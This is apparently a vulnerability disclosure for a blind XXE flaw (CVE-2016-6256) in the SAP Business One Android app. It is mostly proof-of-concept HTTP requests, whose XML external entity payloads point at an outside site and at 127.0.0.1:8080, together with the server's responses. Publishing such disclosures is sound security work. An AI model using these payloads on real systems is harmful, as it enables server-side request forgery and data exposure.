@@ -1,0 +1,157 @@
+﻿Exploit Title: Blind XXE (XML External Entity)in SAP
+Date of Disclosure: 17/05/2017
+Author: Ravindra Singh Rathore
+Vendor Homepage: https://www.sap.com/products/business-one.html
+Product - SAP Business One Android Application
+Version - 1.2.3
+Security Note: 2378065
+CVE - CVE-2016-6256
+CVSS - 6.5 
+
+XXE - An XML External Entity(XXE) attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.
+
+SAP Business One Android Application is vulnerable to XXE. A remote attacker could exploit this vulnerability to expose highly sensitive information from servers.
+
+
+1) HTTP Request Response
+**************************************************************************
+
+POST /B1iXcellerator/exec/soap/vP.001sap0003.in_WCSX/com.sap.b1i.vplatform.runtime/INB_WS_CALL_SYNC_XPT/INB_WS_CALL_SYNC_XPT.ipo/proc HTTP/1.1
+Content-Type: text/xml; charset=UTF-8
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.2.2; Custom Tablet - 4.2.2 - API 17 - 2560x1600 Build/JDQ39E) B1Mobile/1.2.3
+Host: b1hmobile.tdc.sap.com:8443
+Connection: close
+Accept-Encoding: gzip
+Cookie: JSESSIONID=13946F6CFCBB6FE1F2D515087FB08FF3; JSESSIONID=13946F6CFCBB6FE1F2D515087FB08FF3
+Content-Length: 493
+
+<?xml version='1.0' encoding='UTF-8' ?> <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "https://live.com" >]><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetRecentActivity xmlns="http://tempuri.org/"><EndTime>2016-06-30 23:59</EndTime><StartTime>2016-06-01 00:00</StartTime><foo>&xxe;</foo></GetRecentActivity></soap:Body></soap:Envelope>
+
+
+
+
+HTTP/1.1 500 Internal Server Error
+Date: Wed, 18 May 2016 07:01:33 GMT
+Server: 
+X-FRAME-OPTIONS: SAMEORIGIN
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Content-Type: text/xml
+Content-Length: 5566
+Connection: close
+
+<?xml version='1.0' encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><SOAP-ENV:Fault><faultcode>SOAP-ENV:Server</faultcode><faultstring>Server Error</faultstring><detail><xci:reason xmlns:xci="urn:com.sap.b1i.xcellerator:intdoc">Connection timed out: connect</xci:reason><xci:tid xmlns:xci="urn:com.sap.b1i.xcellerator:intdoc">16051808473007955376AC106B972823</xci:tid><xci:exception xmlns:xci="urn:com.sap.b1i.xcellerator:intdoc">com.sap.b1i.xcellerator.XcelleratorException: XCE001 Nested exception:
+com.sap.b1i.xcellerator.XcelleratorException: XCE001 Nested exception:
+com.sap.b1i.utilities.UtilException: UTE001 Nested exception: javax.xml.transform.TransformerException: com.sun.org.apache.xml.internal.utils.WrappedRuntimeException: Connection timed out: connect</xci:exception><xci:callStack xmlns:xci="urn:com.sap.b1i.xcellerator:intdoc">com.sap.b1i.xcellerator.XcelleratorException: XCE001 Nested exception:
+com.sap.b1i.xcellerator.XcelleratorException: XCE001 Nested exception:
+com.sap.b1i.utilities.UtilException: UTE001 Nested exception: javax.xml.transform.TransformerException: com.sun.org.apache.xml.internal.utils.WrappedRuntimeException: Connection timed out: connect
+	at com.sap.b1i.xcellerator.IPOWorkResource.execute(IPOWorkResource.java:527)
+	at com.sap.b1i.xcellerator.IPOStepInstance.executeInner(IPOStepInstance.java:683)
+	at com.sap.b1i.xcellerator.IPOStepInstance.executeOuter(IPOStepInstance.java:518)
+	at com.sap.b1i.xcellerator.Xcellerator.trigger(Xcellerator.java:1422)
+	at com.sap.b1i.xcellerator.SingleAdapterPool.trigger(SingleAdapterPool.java:462)
+	at com.sap.b1i.xcellerator.ActiveListenerInteractor.trigger2(ActiveListenerInteractor.java:191)
+	at com.sap.b1i.xcl_wsar.WSARListener.executeWSAx(WSARListener.java:219)
+	at com.sap.b1i.xcl_wsar.WSARListener.handleWS(WSARListener.java:156)
+	at com.sap.b1i.xcl_http.HTTPListener._doXxx(HTTPListener.java:1504)
+	at com.sap.b1i.xcl_http.HTTPListener._doPost(HTTPListener.java:1405)
+	at com.sap.b1i.xcl_http.HTTPListener.service(HTTPListener.java:805)
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:723)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:563)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293)
+	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:861)
+	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:606)
+	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
+	at java.lang.Thread.run(Thread.java:812)
+Caused by: com.sap.b1i.xcellerator.XcelleratorException: XCE001 Nested exception:
+com.sap.b1i.utilities.UtilException: UTE001 Nested exception: javax.xml.transform.TransformerException: com.sun.org.apache.xml.internal.utils.WrappedRuntimeException: Connection timed out: connect
+	at com.sap.b1i.xcl_wsar.WSARAdapter.get(WSARAdapter.java:295)
+	at com.sap.b1i.xcellerator.IPOStepInstance.handleIO(IPOStepInstance.java:1391)
+	at com.sap.b1i.xcellerator.IPOStepInstance.executeTransaction(IPOStepInstance.java:1050)
+	at com.sap.b1i.xcellerator.IPOWorkResource.execute(IPOWorkResource.java:425)
+	... 24 more
+Caused by: com.sap.b1i.utilities.UtilException: UTE001 Nested exception: javax.xml.transform.TransformerException: com.sun.org.apache.xml.internal.utils.WrappedRuntimeException: Connection timed out: connect
+	at com.sap.b1i.utilities.XMLHandler$DocumentManipulator.transformSource2Result(XMLHandler.java:272)
+	at com.sap.b1i.utilities.SAXDoc2Pass.process(SAXDoc2Pass.java:121)
+	at com.sap.b1i.utilities.SAXDocSplitter.process(SAXDocSplitter.java:14)
+	at com.sap.b1i.xcl_wsar.WSARAdapter.get(WSARAdapter.java:255)
+	... 27 more
+Caused by: javax.xml.transform.TransformerException: com.sun.org.apache.xml.internal.utils.WrappedRuntimeException: Connection timed out: connect
+	at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.getDOM(TransformerImpl.java:584)
+	at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transform(TransformerImpl.java:745)
+	at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transform(TransformerImpl.java:357)
+	at com.sap.b1i.utilities.XMLHandler$DocumentManipulator.transformSource2Result(XMLHandler.java:264)
+	... 30 more
+Caused by: com.sun.org.apache.xml.internal.utils.WrappedRuntimeException: Connection timed out: connect
+	at com.sun.org.apache.xalan.internal.xsltc.dom.XSLTCDTMManager.getDTM(XSLTCDTMManager.java:427)
+	at com.sun.org.apache.xalan.internal.xsltc.dom.XSLTCDTMManager.getDTM(XSLTCDTMManager.java:215)
+	at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.getDOM(TransformerImpl.java:562)
+	... 33 more
+</xci:callStack><xci:retryLater xmlns:xci="urn:com.sap.b1i.xcellerator:intdoc">false</xci:retryLater></detail></SOAP-ENV:Fault></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
+**************************************************************************
+
+
+2) HTTP Request Response
+**************************************************************************
+POST /B1iXcellerator/exec/soap/vP.001sap0003.in_WCSX/com.sap.b1i.vplatform.runtime/INB_WS_CALL_SYNC_XPT/INB_WS_CALL_SYNC_XPT.ipo/proc HTTP/1.1
+Content-Type: text/xml; charset=UTF-8
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.2.2; Custom Tablet - 4.2.2 - API 17 - 2560x1600 Build/JDQ39E) B1Mobile/1.2.3
+Host: b1hmobile.tdc.sap.com:8443
+Connection: close
+Accept-Encoding: gzip
+Cookie: JSESSIONID=3974AE7255D6C15EB0546A903DF474AC; JSESSIONID=3974AE7255D6C15EB0546A903DF474AC
+Content-Length: 498
+
+<?xml version='1.0' encoding='UTF-8' ?> <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >]><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetRecentActivity xmlns="http://tempuri.org/"><EndTime>2016-06-30 23:59</EndTime><StartTime>2016-06-01 00:00</StartTime><foo>&xxe;</foo></GetRecentActivity></soap:Body></soap:Envelope>
+
+
+
+
+
+
+
+
+
+
+
+
+HTTP/1.1 200 OK
+Date: Wed, 15 Jun 2016 10:19:44 GMT
+Server: 
+X-FRAME-OPTIONS: SAMEORIGIN
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Content-Type: text/xml;charset=UTF-8
+Connection: close
+Content-Length: 9689
+
+<?xml version='1.0' encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body>
+<GetRecentActivityResponse xmlns="http://tempuri.org/">
+        <GetRecentActivityResult>[{"Number":"2352","Remarks":"Sales discounts","StartDateTime":"2016-06-01 06:40","Activity":"C","EndDateTime":"2016-06-01 06:55","Organizer":"Tom Mobile","CnctPerson":"Daniel Brown","Status":"","Reminder":"N","RemQty":"15.000000","RemType":"M","Notes":""},{"Number":"2390","Remarks":"Sales planning","StartDateTime":"2016-06-17 06:40","Activity":"M","EndDateTime":"2016-06-17 06:55","Organizer":"Tom Mobile","CnctPerson":"Bob McKensly","Status":"","Reminder":"N","RemQty":"15.000000","RemType":"M","Notes":""}]</GetRecentActivityResult>
+      </GetRecentActivityResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
+
+**************************************************************************
+
+Solution:
+SAP has released patch on 13/12/2016
+ 
+
+## Credits
+ * Ravindra Singh Rathore 
+ * https://in.linkedin.com/in/ravindra-singh-rathore-8aa89236
+ * https://twitter.com/ravindra_hacks
